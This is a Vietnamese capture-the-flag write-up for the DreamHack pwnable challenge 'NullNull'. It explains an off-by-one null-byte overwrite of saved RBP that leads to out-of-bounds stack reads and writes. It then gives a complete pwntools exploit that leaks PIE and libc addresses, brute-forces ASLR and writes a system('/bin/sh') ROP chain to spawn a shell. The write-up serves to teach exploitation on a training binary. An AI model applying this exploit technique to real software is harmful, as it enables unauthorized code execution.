# NullNull---Write-up-----DreamHack
Hướng dẫn cách giải bài NullNull cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 12/3/2026

## 1. Mục tiêu cần làm
Vẫn là tiết mục cũ thôi

<img width="374" height="205" alt="image" src="https://github.com/user-attachments/assets/18a11aab-f3c8-424f-a4e6-fa27766c7de8" />

Tiếp theo là phần code

```C
__int64 __fastcall sub_12F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v4; // rbx
  __int64 v5; // rax

  while ( 1 )
  {
    while ( 1 )
    {
      v2 = sub_1445();
      if ( v2 != 3 )
        break;
      v5 = sub_13FF(a1);
      printf("%ld\n", *(_QWORD *)(8 * v5 + a2));  // Leak bất cứ vị trí nào trên stack
    }
    if ( v2 > 3 )
      break;
    switch ( v2 )
    {
      case 2LL:
        v4 = (_QWORD *)(8 * sub_13FF(a1) + a2);
        *v4 = sub_1445();    // Có thể ghi đè bất cứ vị trí nào trên stack bằng 1 giá trị khác
        break;
      case 0LL:
        return 1LL;
      case 1LL:
        sub_13BD();
        break;
      default:
        return 0LL;
    }
  }
  return 0LL;
}
```

```C
int sub_13BD()
{
  char s[80]; // [rsp+0h] [rbp-50h] BYREF

  if ( (unsigned int)__isoc99_scanf("%80s", s) != 1 )  // Off by one
    _exit(1);
  return puts(s);
}
```

```C
__int64 __fastcall sub_13FF(__int64 a1)
{
  __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = sub_1445();
  if ( v2 < 0 )
    return 0LL;
  if ( v2 < a1 )
    return v2;
  return a1 - 1;
}
```

Đầu tiên là ta có lỗi **Off by one** ở hàm `sub_13BD`, nó sẽ ghi đè byte null lên RBP của chúng ta. Vô tình hay thì biến `a1` và `a2` được khởi tạo bằng `rbp -`.

<img width="650" height="52" alt="image" src="https://github.com/user-attachments/assets/15c3dc65-67c1-46ee-9298-1512bdc88fc8" />

Vậy sẽ ra sao nếu RBP của chúng ta bị thay đổi ? Lỡ như ta thay RBP bằng fake RBP và khi quay lại `sub_12F0`, lúc này `a1` thay vì sẽ khởi tạo bằng `rbp - 0x18` thì nó sẽ khởi tạo bằng `fake rbp - 0x18`. Lúc này hay vì `a1` bị giới hạn là 32 byte như code sau.

```C
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  char v3[256]; // [rsp+0h] [rbp-100h] BYREF

  do
    memset(v3, 0, sizeof(v3));
  while ( (unsigned __int8)sub_12F0(32LL, (__int64)v3) ); // a1 là rdi, a2 là rsi
  _exit(0);
}
```

Thì nó sẽ thành 1 giới hạn khác tùy vào vị trí `fake rbp - 0x18` trỏ vào, lúc đó ta sẽ có lỗi **OOB**. Chưa kể `a2` là điểm định vị của stack frame thì nó cũng bị thay đổi luôn. Thay vì trỏ trên cao như trước thì nó sẽ trỏ xuống dưới thấp stack frame. Từ đó ta có thể leak được rất nhiều thông tin.

Mình đã chạy thử và ta có như sau

<img width="424" height="126" alt="image" src="https://github.com/user-attachments/assets/043a9709-1de6-4eb1-a278-51f0aa396e88" />

Fake RBP mình đã biến thành `0x7fffb721ff00`, ta thấy `0x7fffb721ff00 - 0x18` trỏ vào `0x00005a5cc6709419` = 99354512757785 byte. Vậy là `a1` không còn bị giới hạn ở 32 byte nữa. Tiếp theo là `a2` aka điểm định vị stack frame `0x7fffb721ff00 - 0x20` trỏ vào `0x00007fffb721ff10`. Vậy ta sẽ có stack như sau.

<img width="942" height="722" alt="image" src="https://github.com/user-attachments/assets/62a0d05d-684d-4920-8d98-226141a9f254" />

Dựa vào stack như sau ta sẽ dễ dàng tìm được các index để leak thôi. Giờ làm sao để get shell thì khi mới bắt đầu chạy, chương trình sẽ khởi tạo RBP chuẩn là `0x7fffb721ff40`, sau đó nó sẽ cất vô 1 góc, lúc này RIP cũng sẽ khởi tạo luôn là `0x7fffb721ff48`. Nhưng chúng ta đã **Off by one** nên RBP đã bị nát. Nhưng RIP khởi tạo ban đầu vẫn giữ nguyên nên nó vẫn là `0x7fffb721ff48`. Vậy ta chỉ cần ghi đè ROPchain vô đó là xong.

Ok bắt tay vô làm thôi.

## 2. Cách thực thi
Vì bài này có ASLR nên tỉ lệ chúng ta chỉ có 25% thôi. Mình sẽ tạo ra 1 code để chạy đến khi nào in ra được các giá trị trên stack thì sẽ bắt đầu tính toán.

```Python
def exploit():
    context.log_level = 'error' 
    p = process('./nullnull_patched')
    #p = remote('host3.dreamhack.games',18631)

    try:
        p.sendline(b'1')
        p.send(b'A' * 80)
        p.recvuntil(b'A' * 80 + b'\n')

        leaks = []
        # Quét thử từ index 0 đến 50
        for i in range(50):
            p.sendline(b'3')
            p.sendline(str(i).encode())
            
            # Đọc dòng in ra và chuyển thành số Hex
            leak_dec = int(p.recvline().strip())
            leak_hex = hex(leak_dec)
            leaks.append(leak_hex)

        # Nếu đã quét xong 50 số mà không bị crash, 
        # ta kiểm tra xem trong đó có địa chỉ Libc (0x7f...) hoặc PIE (0x55...) không.
        valid = False
        for leak in leaks:
            if leak.startswith("0x7f") or leak.startswith("0x55") or leak.startswith("0x56") or leak.startswith("0x63"):
                valid = True
                break

        # Nếu toàn số 0 hoặc không có địa chỉ hợp lệ -> Hủy, chạy lại!
        if not valid:
            p.close()
            return False

        # Nếu tới được đây: Bật lại log và in kết quả.
        context.log_level = 'info'
        log.success("RBP đã trượt vào vùng hoàn hảo! Dữ liệu leak được:")
        for i, l in enumerate(leaks):
            # Chỉ in ra những dòng có dữ liệu khác 0 để dễ nhìn
            if l != "0x0":
                print(f"[Index {i:2}] = {l}")
        
```

Sau khi chạy và in ra thành công, mình sẽ bắt đầu tính toán và tạo 1 chuỗi ROPchain. Sau đó mình sẽ ghi đè vào vị trí RIP bằng `*v4 = sub_1445();`.

```Python
pie_leak = int(leaks[7], 16)
        libc_leak = int(leaks[41], 16)

        exe.address = pie_leak - 0x1249
        libc.address = libc_leak - 0x240b3 
        
        log.success(f"PIE Base:  {hex(exe.address)}")
        log.success(f"Libc Base: {hex(libc.address)}")

        rop = ROP(libc)
        ret_gadget = rop.find_gadget(['ret'])[0]
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        bin_sh = next(libc.search(b'/bin/sh\x00'))
        system = libc.sym['system']

        log.info(f"Gadget [ret]:     {hex(ret_gadget)}")
        log.info(f"Gadget [pop rdi]: {hex(pop_rdi)}")
        log.info(f"Chuỗi  [/bin/sh]: {hex(bin_sh)}")
        log.info(f"Hàm    [system]:  {hex(system)}")

        def write_to_stack(index, value):
            p.sendline(b'2')
            p.sendline(str(index).encode())
            p.sendline(str(value).encode())
        
        write_to_stack(7, ret_gadget)
        write_to_stack(8, pop_rdi)
        write_to_stack(9, bin_sh)
        write_to_stack(10, system)
        p.sendline(b'0')
```

Vậy là xong. Giờ ta chỉ cần thoát chương trình là get shell nha, bài này hơi khó nhằn vì ASLR + hơi rối ở phần RBP. Bản thân mình đánh giá bài này độ khó là cỡ 5-6. Thôi thì hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3. Exploit

```Python
from pwn import *

exe = ELF("./nullnull_patched")
libc = ELF("./libc.so.6")
context.binary = exe

def exploit():
    context.log_level = 'error' 
    p = process('./nullnull_patched')
    #p = remote('host3.dreamhack.games',18631)

    try:
        p.sendline(b'1')
        p.send(b'A' * 80)
        p.recvuntil(b'A' * 80 + b'\n')

        leaks = []
        # Quét thử từ index 0 đến 50
        for i in range(50):
            p.sendline(b'3')
            p.sendline(str(i).encode())
            
            # Đọc dòng in ra và chuyển thành số Hex
            leak_dec = int(p.recvline().strip())
            leak_hex = hex(leak_dec)
            leaks.append(leak_hex)

        # Nếu đã quét xong 50 số mà không bị crash, 
        # ta kiểm tra xem trong đó có địa chỉ Libc (0x7f...) hoặc PIE (0x55...) không.
        valid = False
        for leak in leaks:
            if leak.startswith("0x7f") or leak.startswith("0x55") or leak.startswith("0x56") or leak.startswith("0x63"):
                valid = True
                break

        # Nếu toàn số 0 hoặc không có địa chỉ hợp lệ -> Hủy, chạy lại!
        if not valid:
            p.close()
            return False

        # Nếu tới được đây: Bật lại log và in kết quả.
        context.log_level = 'info'
        log.success("RBP đã trượt vào vùng hoàn hảo! Dữ liệu leak được:")
        for i, l in enumerate(leaks):
            # Chỉ in ra những dòng có dữ liệu khác 0 để dễ nhìn
            if l != "0x0":
                print(f"[Index {i:2}] = {l}")
        
        gdbscript = '''
        tel $rsp 60
        '''
        gdb.attach(p, gdbscript=gdbscript)
        pause()
        
        pie_leak = int(leaks[7], 16)
        libc_leak = int(leaks[41], 16)

        exe.address = pie_leak - 0x1249
        libc.address = libc_leak - 0x240b3 
        
        log.success(f"PIE Base:  {hex(exe.address)}")
        log.success(f"Libc Base: {hex(libc.address)}")

        rop = ROP(libc)
        ret_gadget = rop.find_gadget(['ret'])[0]
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        bin_sh = next(libc.search(b'/bin/sh\x00'))
        system = libc.sym['system']

        log.info(f"Gadget [ret]:     {hex(ret_gadget)}")
        log.info(f"Gadget [pop rdi]: {hex(pop_rdi)}")
        log.info(f"Chuỗi  [/bin/sh]: {hex(bin_sh)}")
        log.info(f"Hàm    [system]:  {hex(system)}")

        def write_to_stack(index, value):
            p.sendline(b'2')
            p.sendline(str(index).encode())
            p.sendline(str(value).encode())
        
        write_to_stack(7, ret_gadget)
        write_to_stack(8, pop_rdi)
        write_to_stack(9, bin_sh)
        write_to_stack(10, system)
        p.sendline(b'0')

        return p

    except (EOFError, ValueError):
        p.close()
        return False

p = False
log.info("Đang tự động Brute-force ASLR... Vui lòng đợi vài giây...")
while not p:
    p = exploit()

p.interactive()
```
